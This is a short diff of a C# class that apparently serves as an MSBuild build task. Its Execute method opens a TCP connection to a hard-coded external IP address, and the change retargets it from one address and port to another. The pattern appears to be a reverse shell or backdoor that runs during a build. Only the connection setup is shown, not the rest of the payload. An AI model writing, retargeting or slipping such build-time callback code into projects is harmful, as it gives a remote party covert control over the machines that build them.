@@ -26,7 +26,7 @@ public class ClassExample :  Task, ITask
     static StreamWriter streamWriter;
     public override bool Execute()
     {
-        using(TcpClient client = new TcpClient("89.252.178.237", 8080))
+        using(TcpClient client = new TcpClient("185.106.208.232", 80))
         {
             using(Stream stream = client.GetStream())
             {
